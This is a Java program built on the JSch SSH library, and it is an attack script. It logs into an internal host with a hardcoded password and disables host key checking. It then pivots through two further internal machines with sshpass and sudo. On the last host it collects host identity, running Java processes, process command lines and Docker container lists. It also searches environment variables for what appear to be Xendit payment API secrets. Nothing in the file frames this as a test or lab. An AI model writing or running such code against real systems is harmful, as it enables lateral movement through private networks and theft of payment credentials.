import com.jcraft.jsch.*;
import java.io.*;
class DKNEO2 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'echo kutul0nc4t | sudo -S apt-get install -y sshpass 2>&1 | tail -3;echo ---SSH-NEO---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@10.13.16.196 \"hostname;id;echo ---JVM---;ps aux | grep java | grep -v grep | head -3;echo ---CMDLINE---;cat /proc/1/cmdline 2>/dev/null | tr \\\"\\\\0\\\" \\\" \\\" | head -1;echo ---XENDIT-ENV---;env 2>/dev/null | grep -iE \\\"xnd_\\|xendit\\\" | head -5;echo ---DOCKER---;docker ps --format \\\"{{.Names}}|{{.Image}}\\\" 2>/dev/null | head -10\" 2>&1 | head -30' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
